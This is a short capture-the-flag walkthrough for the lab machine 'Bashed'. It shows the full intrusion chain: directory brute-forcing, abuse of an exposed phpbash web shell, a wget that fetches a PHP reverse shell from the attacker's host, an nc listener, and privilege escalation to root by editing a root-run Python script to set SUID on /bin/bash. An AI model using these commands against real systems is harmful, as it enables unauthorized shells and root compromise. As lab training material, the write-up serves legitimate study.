# Bashed

We just did gobuster on the main dir since on nmap we got a http running on port 80.

So we got the route `http://10.10.10.68/dev/phpbash.php`
and run a revershell command, since the usual nc and bash wont work for this one we use the python one.

[SimpleHTTPServer.py](https://github.com/enthought/Python-2.7.3/blob/master/Lib/SimpleHTTPServer.py)
[php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

**DONT FORGET TO MODIFY THE IP AND PORT**

```
python2 SimpleHTTPServer.py 80
```

Now that our server is running we use this command on the phpbash and save it on `/var/www/html/uploads` (We found this path before with gobuster)

```
wget 10.10.14.10/shell.php
```

And we start listening

```
nc -lnvp 4444
```

It works but we are missing something, yup you got it *le classice*

* `script /dev/null -c bash`
* CTRL + Z
* `stty raw -echo; fg`
* `reset xterm`
* export TERM=xterm
* export SHELL=bash

## Scalating privileges

On `sudo -l` we found 2 things, *scriptmanager* doesnt requiere a password and it runs on /bin/bash so we do

```
sudo -u scriptmanager /bin/bash
```

On `/scripts/` we find 2 files which test.py is owned by us so we can just modify it with
so we do this on test.py

```
import os

os.system("chmod u+s /bin/bash")
```


After that we just watch for any change on the file

`watch -n 1 ls -l /bin/bash`

If it changes to `rwsr` we made it

After that we just run bash as root `bash -p`, `whoami` > root, we got it go for the flag 